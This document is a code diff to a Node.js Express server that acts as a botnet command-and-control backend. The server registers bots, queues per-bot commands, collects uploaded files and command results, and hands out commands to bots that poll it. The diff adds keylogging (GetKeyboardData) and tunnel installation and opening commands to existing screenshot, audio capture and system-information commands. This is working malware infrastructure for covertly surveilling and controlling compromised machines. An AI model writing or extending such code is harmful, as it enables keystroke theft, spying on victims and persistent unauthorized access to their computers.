@@ -3,7 +3,20 @@ const multer = require("multer");
 const logger = require("./logger");
 const {Channel} = require("./channel");
 
-const {Idle, UploadFile, Ping, Announce, Screenshot, GetSysInfo, GetPublicIp, GetPrivateIp, AudioCapture} = require("./commands")
+const {
+    Idle,
+    UploadFile,
+    Ping,
+    Announce,
+    Screenshot,
+    GetSysInfo,
+    GetPublicIp,
+    GetPrivateIp,
+    AudioCapture,
+    OpenTunnel,
+    GetKeyboardData,
+    InstallTunnel
+} = require("./commands")
 
 const storage = multer.diskStorage({
     destination: (req, file, cb) => {
@@ -58,7 +71,7 @@ function createChannel(botId) {
 }
 
 function registerBot(bot) {
-    logger.info("registering bot : " + bot.name);
+    logger.info("[NEW] Registering bot : " + bot.name);
     createChannel(bot.id);
     bots.push(bot)
 }
@@ -111,12 +124,30 @@ function sendCommand(command) {
             targetChannel.commands.push(privateCommand)
             break
 
+        case "InstallTunnel":
+            logger.info("Adding InstallTunnel command")
+            const installTunnelCommand = new InstallTunnel()
+            targetChannel.commands.push(installTunnelCommand)
+            break
+
+        case "OpenTunnel":
+            logger.info("Adding OpenTunnel command")
+            const openTunnelCommand = new OpenTunnel()
+            targetChannel.commands.push(openTunnelCommand)
+            break
+
+        case "GetKeyboardData":
+            logger.info("Adding GetKeyboardData command")
+            const getKeyboardDataCommand = new GetKeyboardData()
+            targetChannel.commands.push(getKeyboardDataCommand)
+            break
     }
 }
 
 function popCommand(botId) {
     const targetChannel = channels.find((channel) => channel.botId === botId)
     if (!targetChannel) {
+        logger.warn("No channel found for bot : " + botId + " -> aborting pop command.")
         sendCommand(new Idle())
     }
     targetChannel.commands.shift()
@@ -126,6 +157,7 @@ function getCommands(botId) {
     const targetChannel = channels.find((channel) => channel.botId === botId)
 
     if (!targetChannel) {
+        logger.warn("Unknown bot : " + botId + " get command -> sending announce command.")
         const announceCommand = new Announce()
         return JSON.stringify(announceCommand)
     }
@@ -133,9 +165,9 @@ function getCommands(botId) {
     const commands = targetChannel.commands
 
     if (commands.length >= 1) {
-        command = commands.at(0)
-        logger.info(`Command picked : ${command}`)
-        return JSON.stringify(command)
+        const head = commands.at(0)
+        logger.info(`Command picked : ${head}`)
+        return JSON.stringify(head)
     }
 
     const idleCommand = new Idle()
@@ -148,7 +180,9 @@ function addChannelMessage(botId, message) {
     if (targetChannel) {
         logger.info("Adding message to channel.")
         targetChannel.messages.push(message)
+        return
     }
+    logger.warn("No channel found for bot : " + botId + " -> aborting message.")
 
 }
 
@@ -169,8 +203,6 @@ app.post("/backend/commands", (req, res) => {
 });
 
 app.get("/backend/commands", (req, res) => {
-
-
     const allCommands = {}
 
     channels.forEach((channel) => {
@@ -214,8 +246,8 @@ app.post("/",  upload.single('file'), (req, res) => {
         return;
     }
     else if (payload.name === "COMMAND_RESULT") {
-        logger.info("command result from bot : " + payload.id);
-        logger.info("command result : " + payload.result);
+        logger.info("[RESULT] command result from bot : " + payload.id);
+        logger.info("[RESULT] command result : " + payload.result);
         logger.info(payload.result)
 
         popCommand(payload.id)
@@ -234,5 +266,5 @@ app.post("/",  upload.single('file'), (req, res) => {
 
 
 app.listen(port, () => {
-  console.log(`Application exemple à l'écoute sur le port ${port}!`);
+  console.log(`Server started at http://127.0.0.1:${port} available on http://0.0.0.0:${port} !`);
 });
